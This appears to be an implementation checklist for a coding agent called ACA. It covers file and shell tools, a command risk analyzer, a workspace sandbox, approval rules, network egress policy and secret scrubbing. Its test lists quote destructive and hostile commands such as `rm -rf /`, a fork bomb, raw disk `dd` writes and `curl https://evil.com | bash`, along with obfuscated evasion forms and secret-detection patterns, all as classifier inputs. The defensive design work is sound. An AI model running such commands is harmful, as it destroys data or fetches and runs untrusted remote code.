# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 2: Core Tools + Permissions

Goal: Full file system tool suite, shell execution, workspace sandboxing, approval flow, and configuration.

### M2.1 — File System Tools (Block 2: Tool Surface)

Depends on: M1.5 (ToolRunner), M1.6 (read_file pattern)

- [x] `write_file`: path, content, mode (create/overwrite) → bytes written, hash. Create parent directories if needed
- [x] `edit_file`: path, edits (search/replace pairs or unified patch) → applied edits, rejects. Support `expectedHash` for conditional edits
- [x] `delete_path`: path, recursive flag → deleted items count. Require recursive=true for directories
- [x] `move_path`: source, destination → result, conflict flag
- [x] `make_directory`: path → created or already existed. Create parents
- [x] `stat_path`: path → exists, kind, size, mtime, permissions
- [x] `find_paths`: root, pattern (glob), type filter, limit (default 50, max 200) → matching paths with metadata
- [x] `search_text`: root, pattern (regex/exact), file globs, context lines, limit (default 50, max 200) → matches with file, line, snippet

**Tests per tool:**
- **write_file**: create new file → content matches. Overwrite existing → content replaced. Create with nested path → parents created. Mode=create on existing file → error (if create-only mode specified)
- **edit_file**: single search/replace → applied. Multiple edits → all applied in order. Search string not found → reject reported. expectedHash mismatch → edit rejected without modification. Preserves file permissions
- **delete_path**: delete file → gone. Delete empty dir → gone. Delete non-empty dir without recursive → error. Delete non-empty dir with recursive → all gone. Delete nonexistent → error
- **move_path**: rename file → old gone, new exists. Move to existing path → conflict flag. Cross-directory move works
- **make_directory**: create → exists. Create existing → success (already existed). Create nested → all parents created
- **stat_path**: file → correct kind/size/mtime. Directory → kind=directory. Nonexistent → exists=false
- **find_paths**: glob `*.ts` in test fixture → finds .ts files, not .js. Limit 2 → returns exactly 2. Respects .gitignore patterns. Max 200 cap enforced
- **search_text**: regex pattern → matches with line numbers and context. Exact match mode. File glob filter. Limit cap. No matches → empty results

### M2.2 — Shell Execution Tools (Block 2: Tool Surface)

- [x] `exec_command`: command, cwd, env, timeout → exit code, stdout, stderr, duration. 64 KiB output cap (head + tail preserved). Default timeout 60s
- [x] `open_session`: command, cwd, env → session_id, initial output. Register in process registry
- [x] `session_io`: session_id, stdin?, signal?, wait → incremental output, status
- [x] `close_session`: session_id, signal? → final status. Kill process tree
- [x] Process registry: track PID, process group, start time, idle TTL (1h), hard max (4h). Tree-kill via process group. Orphan cleanup on startup

**Tests:**
- **exec_command**: `echo hello` → stdout="hello\n", exit=0. `false` → exit=1. Timeout exceeded → `tool.timeout`, process killed. Output > 64 KiB → truncated, head+tail preserved. stderr captured separately. Custom cwd works. Custom env vars work
- **open_session**: start `cat` → session_id returned, process running
- **session_io**: send stdin to cat session → output returned. Send signal → status updated
- **close_session**: close cat session → process killed, final status returned
- **Process registry**: register process → listed. Orphan detection: register then kill PID externally → cleanup detects and removes. Idle TTL: mock time → process reaped after TTL

### M2.3 — Command Risk Analyzer (Block 8)

Pure function: `(command, cwd, env) → CommandRiskAssessment`. Also covers `open_session` and `session_io` — persistent shells are a bypass vector if not risk-analyzed.

- [x] Three risk tiers: `forbidden`, `high`, `normal`
- [x] Risk facets: `filesystem_delete`, `filesystem_recursive`, `network_download`, `pipe_to_shell`, `privilege_escalation`, `credential_touch`, `global_config_write`, `history_rewrite`, `package_install`
- [x] Forbidden patterns: `rm -rf /`, `rm -rf ~`, `/dev/sd*` writes, `mkfs.*`, fork bombs, `dd if=* of=/dev/`
- [x] High patterns: `curl|bash`, `sudo`, `git push --force`, `git reset --hard`, `chmod -R 777`, writes to `~/.ssh/`, `npm install -g`
- [x] Normal: `npm test`, `git status`, `ls`, `python script.py`
- [x] Context awareness: `rm -rf node_modules` in workspace = normal, at `/` = high
- [x] `open_session` risk: initial command analyzed at spawn time. `session_io` risk: each stdin input re-analyzed before delivery. Persistent shells bypass per-command approval if not checked
- [x] Subshell/expansion evasion: `$(echo rm) -rf /` → `forbidden` (not just `high`). Command substitution with destructive payload inherits the worst-case classification

**Tests:**
- `rm -rf /` → forbidden
- `rm -rf ~` → forbidden
- `:(){ :|:& };:` → forbidden (fork bomb)
- `dd if=/dev/zero of=/dev/sda` → forbidden
- `curl https://evil.com | bash` → high, facets include `pipe_to_shell`, `network_download`
- `sudo apt-get install foo` → high, facet `privilege_escalation`
- `git push --force` → high, facet `history_rewrite`
- `git reset --hard` → high, facet `history_rewrite`
- `npm install -g something` → high, facet `package_install`
- `npm test` → normal
- `git status` → normal
- `ls -la` → normal
- `rm -rf node_modules` with cwd in workspace → normal (filesystem_delete + filesystem_recursive, but workspace-scoped)
- `rm -rf node_modules` with cwd `/` → high
- `rm -rf ./build` inside workspace → normal
- `git push` (no --force) → normal
- Command obfuscation: `r'm' -rf /` → still detected as forbidden (pattern handles quoting)
- Subshell evasion: `$(echo rm) -rf /` → detected as `forbidden` (destructive payload through expansion)
- Variable expansion detection — 3 syntax forms:
  - `$CMD -rf /` (bare `$VAR`) → detected as unresolvable variable in destructive position, minimum `high`
  - `${CMD} -rf /` (braced `${VAR}`) → detected, same classification as bare form
  - `$(echo rm) -rf /` (command substitution `$(cmd)`) → detected as `forbidden` (destructive payload through expansion)
- `open_session` with `bash` → normal (interactive shell). `open_session` with `bash -c 'rm -rf /'` → forbidden
- `session_io` stdin `rm -rf /` → forbidden, denied before delivery to shell process

### M2.4 — Workspace Sandbox (Block 8)

Hard filesystem boundary enforcement.

- [x] Zone check: for existing paths, resolve via `fs.realpath` and verify the resolved path falls within allowed zones. For create operations (`write_file`, `make_directory`), resolve the nearest existing ancestor via `fs.realpath`, verify the ancestor is within an allowed zone, then validate the remaining path components contain no traversal (`..`). This handles nonexistent target paths without requiring the full path to exist
- [x] Allowed zones: workspace root, current session dir (`~/.aca/sessions/<ses_ULID>/`), scoped tmp (`/tmp/aca-<ses_ULID>/`), user-configured `extraTrustedRoots`
- [x] Symlink handling: resolve target, deny if outside all zones
- [x] Path traversal: `../` collapsed before zone check
- [x] Integration: all file system tools call zone check before any operation
- [x] `exec_command` is NOT sandboxed (policy-sandboxed via risk analyzer instead)

**Tests:**
- Path within workspace → allowed
- Path in session dir → allowed
- Path in scoped tmp → allowed
- Path in extraTrustedRoots → allowed
- Path outside all zones (e.g., `/etc/passwd`) → denied with `tool.permission_denied`
- Path traversal (`../../etc/passwd` from workspace) → resolves outside → denied
- Symlink within workspace pointing outside → denied, error message shows resolved target
- Symlink within workspace pointing to workspace subdirectory → allowed
- `/tmp/random-dir` (not scoped) → denied
- `/tmp/aca-<correct_session_id>/file` → allowed
- `~/.ssh/id_rsa` → denied
- `~/.aca/sessions/<different_session>/` → denied
- TOCTOU: verify atomic check-and-open. For existing files: open with `O_NOFOLLOW` or resolve+open atomically. For create operations: open parent dir fd, then create relative to it (`openat(dirfd, basename, O_CREAT|O_EXCL)`) to prevent symlink race between zone check and file creation
- Mount point traversal: path within workspace resolves to different filesystem mount → still allowed (zone check uses resolved path, not device)

### M2.5 — Configuration System (Block 9)

> **Before Approval Flow** because approval reads from resolved config (pre-auth rules, class overrides, network policy).

Full config loading pipeline.

- [x] JSON Schema definition for config (using `ajv` for validation)
- [x] 5-source precedence: CLI flags > env vars > project config > user config > defaults
- [x] Trust boundary filtering: project-safe schema (subset), silently drop disallowed fields
- [x] Merge semantics: scalars=last-wins, objects=deep-merge, arrays=replace for regular arrays, permissions=most-restrictive-wins. Permission-sensitive arrays use restrictive composition, not plain replace: `denyDomains` and `blockedTools` use set-union (more blocked = more restrictive), `allowDomains` uses set-intersection (fewer allowed = more restrictive)
- [x] `ACA_` prefix env var mapping (e.g., `ACA_MODEL_DEFAULT`)
- [x] `ResolvedConfig` type: frozen, immutable for session duration
- [x] Config loading pipeline (9 steps): load defaults → user config → project config (filtered) → env vars → CLI flags → merge → most-restrictive permissions → validate → freeze
- [x] Secrets loading: env vars primary, `~/.aca/secrets.json` fallback, 0600 permission check
- [x] Config drift detection: compare current resolved config against session snapshot on resume
- [x] `trustedWorkspaces` step: map in user config, `aca trust`/`aca untrust` modify it, expanded project-safe schema for trusted workspaces
- [x] `providers` array config (Block 17): support multiple provider entries with priority, top-level `defaultProvider` selects active provider, `apiTimeout` as global fallback

**Tests:**
- Defaults only (no config files, no env vars) → valid ResolvedConfig with all defaults
- User config overrides defaults → correct merge
- Project config with disallowed fields (e.g., `sandbox.extraTrustedRoots`) → fields silently dropped
- Project config with allowed fields (e.g., `model.default`) → applied
- Env var `ACA_MODEL_DEFAULT=gpt-4o` → overrides user config default model
- CLI flag `--model claude` → overrides everything
- Most-restrictive-wins: user config allows 5 tools, project config allows 3 of those → intersection = 3
- Array replace (regular arrays): user config has `ignorePaths` [a, b], project config has [c] → result is [c]
- Permission arrays differ: user `denyDomains` [a, b] + project `denyDomains` [c] → union [a, b, c] (more restrictive). User `allowDomains` [a, b] + project `allowDomains` [a, c] → intersection [a] (more restrictive). User `blockedTools` [x] + project `blockedTools` [y] → union [x, y]
- Malformed user config → warning, fall back to defaults
- Malformed project config → warning, ignored entirely
- Missing secrets file → not an error (only env var path)
- Secrets file with wrong permissions (0644) → refuse to load, error message
- `schemaVersion` field: known version → loaded normally. Unknown higher version → warning, unknown fields ignored
- Frozen config: attempt to mutate → TypeError (Object.freeze)
- Trust boundary: new `providers`, `budget`, `retention` fields are user-only (silently dropped from project config)
- **Config precedence chain (end-to-end):** set `model.default` at all 5 levels (defaults=`d`, user=`u`, project=`p`, env=`e`, CLI=`c`) → resolved value is `c`. Remove CLI → `e`. Remove env → `p`. Remove project → `u`. Remove user → `d`. Each level wins only when all higher-priority levels are absent
- **Trust boundary escalation:** project config sets `sandbox.extraTrustedRoots: ["/tmp/evil"]` → silently dropped, resolved config has no extra roots. Same project config in a `trustedWorkspaces` entry → field accepted (expanded schema)
- **Trust boundary completeness:** project config attempts each user-only field (`providers`, `budget`, `retention`, `sandbox.extraTrustedRoots`) → all silently dropped, no error emitted, remaining project fields still applied

### M2.6 — Approval Flow (Block 8)

Permission resolution for each tool call. Depends on M2.5 (config) for resolved policy.

- [x] Approval classes per tool: read-only (auto), workspace-write (confirm), external-effect (confirm), user-facing (interactive)
- [x] 7-step approval resolution algorithm:
  1. Profile check (tool in allowed set?)
  2. Sandbox check (path in zone?)
  3. Risk analysis (for exec_command, open_session, session_io)
  4. Class-level policy
  5. Pre-authorization match
  6. Session grants
  7. Final decision
- [x] Session grants: fingerprinted by tool+pattern, persist within session
- [x] `--no-confirm` flag: auto-approve `confirm`, never override `confirm_always` or `deny`
- [x] Interactive confirmation prompt: `[y] approve [n] deny [a] always [e] edit`
- [x] `[a] always` creates session grant
- [x] `confirm_always` approval level: a `confirm` variant that `--no-confirm` cannot auto-approve. Used for destructive operations — always requires interactive approval. Unlike `deny` (which blocks unconditionally), `confirm_always` allows execution after explicit user confirmation
- [x] `delete_path`/`move_path` escalation: these tools escalate to `confirm_always` even if their workspace-write class would otherwise be `allow` (per spec: "unless explicitly overridden per-tool")

**Tests:**
- read_file → auto-approved (read-only class)
- write_file → requires confirmation (workspace-write)
- exec_command → requires confirmation (external-effect)
- exec_command with `--no-confirm` → auto-approved
- Forbidden command with `--no-confirm` → still denied (deny overrides no-confirm)
- `delete_path` with `--no-confirm` → still requires confirmation (`confirm_always` overrides `--no-confirm`)
- `move_path` with `--no-confirm` → still requires confirmation (`confirm_always` overrides `--no-confirm`)
- `confirm_always` with explicit user `[y]` → approved (not blocked like `deny`)
- Session grant: approve `npm test` with [a] → next `npm test` auto-approved
- Session grant scoping: grant for `npm test` does not approve `npm install`
- Pre-auth rule matching: regex `^npm (test|build)$` → matches `npm test`, not `npm install`
- Profile check: tool not in profile → denied before other checks
- Sandbox violation → denied at step 2 regardless of other rules
- Risk analysis covers `open_session` (at spawn) and `session_io` (each stdin input)

### M2.7 — Network Egress Policy Foundation (Block 8)

Block 8 defines network egress as part of the permission model. The core policy engine belongs here; full integration into web/browser tools is in M7.

- [x] `NetworkPolicy` type: mode (`off`, `approved-only`, `open`), allowDomains (glob[]), denyDomains (glob[]), allowHttp (boolean)
- [x] Policy resolver: read from `ResolvedConfig`, evaluate domain against allow/deny lists
- [x] 3 modes: `off` → all network denied, `approved-only` → allowlist or confirmation, `open` → allowed (still subject to denyDomains)
- [x] denyDomains takes precedence over allowDomains
- [x] Localhost exception: `127.0.0.1`, `::1`, `localhost` auto-allowed in all modes except `off`
- [x] HTTPS-only default: HTTP URLs denied unless `allowHttp: true`
- [x] Best-effort shell command detection: `curl`, `wget`, `ssh`, `git clone`, `npm install` in `exec_command` → evaluate against network policy
- [x] Integration point: `ToolRunner` calls network policy check before executing network-capable tools

**Tests:**
- Mode=off → network tools return `network_disabled` error
- Mode=approved-only, domain in allowDomains → auto-allowed
- Mode=approved-only, domain in denyDomains → denied
- Mode=approved-only, unknown domain → requires confirmation
- Mode=open → all allowed (still subject to denyDomains)
- denyDomains precedence: domain in both allow and deny → denied
- Localhost → auto-allowed in approved-only and open modes
- HTTP URL with allowHttp=false → denied with clear error
- Shell network detection (5 commands individually tested):
  - `exec_command` with `curl https://evil.com` + mode=off → denied, facet `network_download`
  - `exec_command` with `wget https://evil.com/file` + mode=off → denied, facet `network_download`
  - `exec_command` with `ssh user@host` + mode=off → denied, facet `network_access`
  - `exec_command` with `git clone https://github.com/repo` + mode=off → denied, facet `network_download`
  - `exec_command` with `npm install package` + mode=off → denied, facet `package_install`
- Localhost exception does NOT apply to `exec_command` shell detection (shell can do anything once running)

### M2.8 — Secrets Scrubbing Pipeline (Block 8)

Block 8 specifies 4-point scrubbing with two detection strategies. Both are implemented here at baseline; M7.8 extends with the full pattern set.

- [x] `SecretPattern` interface for pattern registry entries:
  ```typescript
  interface SecretPattern {
    name: string;              // Pattern identifier (e.g., "api_key_prefix", "bearer_token")
    pattern: RegExp;           // Detection regex
    type: string;              // Redaction type label used in placeholder (e.g., "api_key", "bearer", "pem_key")
    contextRequired?: string;  // Optional context that must be adjacent (e.g., "Authorization")
  }
  ```
- [x] `SecretScrubber` class: maintains a set of known secret values (loaded from env vars + `secrets.json`) plus a registry of `SecretPattern` entries
- [x] Strategy 1: exact-value redaction — any known API key value found in text is replaced
- [x] Strategy 2 (baseline patterns): context-sensitive pattern detection for the highest-impact unknown secret types. Patterns for this step: API key prefixes (`sk-`, `pk_test_`, `AKIA`, `ghp_`, `ghs_`, `glpat-`), Bearer tokens (`Authorization: Bearer ...`), PEM private keys (`-----BEGIN ... PRIVATE KEY-----`). M7.8 extends with: `.env` assignments, connection strings, JWT tokens, high-entropy+label heuristics
- [x] Redaction format: `<redacted:type:N>` with per-session counter (e.g., `<redacted:api_key:1>`)
- [x] 4 pipeline integration points:
  1. Tool output: scrub before storing in `ToolResultItem`
  2. LLM context assembly: scrub before sending to provider
  3. Persistence: scrub before writing to conversation.jsonl / events.jsonl
  4. Terminal rendering: scrub before displaying to user
- [x] Pipeline is a composable function: `scrub(text: string) → string`
- [x] Known secrets populated at startup from resolved secrets (Block 9)
- [x] `scrubbing.enabled: false` in config → pipeline is a no-op passthrough

**Tests:**
- Known API key in tool output → redacted to `<redacted:api_key:1>`
- Same key appears twice → same redaction ID (consistent replacement)
- Scrubbing disabled → text passes through unchanged
- All 4 pipeline points: inject known secret → verify redacted at each point
- Secret in JSONL write → redacted in persisted file
- Secret in LLM request → redacted before sending
- Non-secret strings → not modified
- Empty scrubber (no known secrets) → passthrough
- Strategy 2 baseline: `sk-abc123...` in tool output → redacted (API key prefix match)
- Strategy 2 baseline: `Authorization: Bearer eyJhbG...` → Bearer token redacted
- Strategy 2 baseline: `-----BEGIN RSA PRIVATE KEY-----\n...` → PEM block redacted
- Strategy 2 baseline: `ghp_xxxxxxxxxxxx` → redacted (GitHub PAT prefix)
- Strategy 2 baseline: `glpat-xxxxxxxxxxxx` → redacted (GitLab PAT prefix)
- Strategy 2 baseline: `AKIA1234567890EXAMPLE` → redacted (AWS access key ID prefix)
- Strategy 2 baseline: regular string `skeleton` → NOT redacted (false positive guard: `sk-` prefix must be followed by key-length content)

---

## Post-Milestone Review
<!-- risk: high — shell execution, permission enforcement, secrets handling, network access -->
<!-- final-substep: M2.8 — gate runs after this substep completes -->
- [x] Architecture review (4 witnesses): spec drift, coupling, interface consistency
- [x] Security review (4 witnesses): permission escalation, trust boundary composition, secrets leak paths
- [x] Bug hunt (4 witnesses): cross-module integration, adversarial state transitions
- [x] Arch findings fed into security prompt; security findings fed into bug hunt prompt
- [x] Critical findings fixed and verified before next milestone
- [x] Bug hunt findings converted to regression tests
- [x] Review summary appended to changelog
